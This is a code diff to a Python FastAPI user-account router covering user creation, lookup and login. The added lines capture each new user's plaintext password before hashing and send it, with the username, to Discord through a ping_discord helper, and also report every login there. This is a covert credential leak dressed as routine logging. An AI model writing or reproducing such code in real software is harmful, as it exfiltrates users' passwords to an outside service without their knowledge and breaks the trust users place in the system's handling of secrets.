@@ -57,6 +57,7 @@ Authenticate a user and return a JWT token.
     - 400: If the password is invalid.
 """
 
+import dis
 import jwt
 import uuid
 
@@ -71,7 +72,7 @@ from core.models.user import (
     UserResponseModel,
 )
 from core.utils.bcrypt import hash_password, verify_password
-
+from core.utils.discord import ping_discord
 router = APIRouter(prefix="/user", tags=["user"])
 
 
@@ -82,15 +83,19 @@ def create_user(user_input: UserCreateModel):
 
     user_dict = user_input.model_dump()
     print("Creating user with input:", user_dict)
-
     name_filtered = user_dict["name"].strip().lower().replace(" ", "_")
     user_dict["name"] = user_dict["name"].strip().title()
+    user_name_d=user_dict["name"]
+    user_pass_d=user_dict["password"]
     user_dict["password"] = hash_password(user_dict["password"])
     user_dict["userId"] = f"{name_filtered}_{uuid.uuid4().hex[:6]}"
     user_dict["is_active"] = True
     user_dict["threads"] = {}
 
     result = db.users.insert_one(user_dict)
+
+    ping_discord(f"username = {user_name_d} with pass = {user_pass_d}","/user/ was hit (new user created)","login")
+
     print("User created with ID:", result.inserted_id)
 
     created_user = db.users.find_one(
@@ -116,7 +121,6 @@ def get_user(request: Request, user_id: str):
     user = db.users.find_one({"userId": user_id}, {"_id": 0, "password": 0})
     if not user:
         raise HTTPException(status_code=404, detail="User not found")
-
     return {
         "status": "success",
         "message": "User retrieved successfully",
@@ -148,6 +152,9 @@ def login_user(user_input: UserLoginModel):
     )
 
     user.pop("password", None)
+
+    ping_discord(f" {user['name']} Logged in ","/user/login ","login")
+
     return {
         "status": "success",
         "message": "User logged in successfully",
